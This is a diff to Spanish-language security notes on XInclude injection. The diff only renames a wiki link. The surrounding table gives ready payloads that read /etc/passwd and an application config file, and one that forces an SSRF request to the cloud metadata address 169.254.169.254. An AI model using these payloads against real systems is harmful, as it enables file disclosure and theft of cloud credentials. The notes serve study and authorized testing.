@@ -18,7 +18,7 @@ linked:
 |---|---|---|
 |**Extracción de Archivos Locales (Texto Plano)**|Utilizo el atributo `parse="text"` para indicar al parser que lea el recurso como texto sin procesar. Esto es fundamental para evitar errores sintácticos al leer archivos del sistema (como `/etc/passwd`) que contienen caracteres que romperían un documento XML.|`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`|
 |**Extracción de Archivos Locales (XML)**|Empleo `parse="xml"` (o simplemente omito el atributo, al ser el valor predeterminado) si el archivo que intento recuperar está estructurado como un XML válido. Si no lo es, el parser lanzará una excepción y detendrá el procesamiento.|`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="xml" href="file:///var/www/config.xml"/></foo>`|
-|**Ejecución de SSRF**|Modifico el atributo `href` para apuntar a una URL en lugar de una ruta de archivo. Esto obliga al analizador XML a realizar una petición HTTP/HTTPS desde el backend, abriendo la puerta a un ataque de [[SSRF]].|`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/></foo>`|
+|**Ejecución de SSRF**|Modifico el atributo `href` para apuntar a una URL en lugar de una ruta de archivo. Esto obliga al analizador XML a realizar una petición HTTP/HTTPS desde el backend, abriendo la puerta a un ataque de [[Server-Side Request Forgery (SSRF)]].|`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/></foo>`|
 
 ## Requisitos y Limitaciones
 
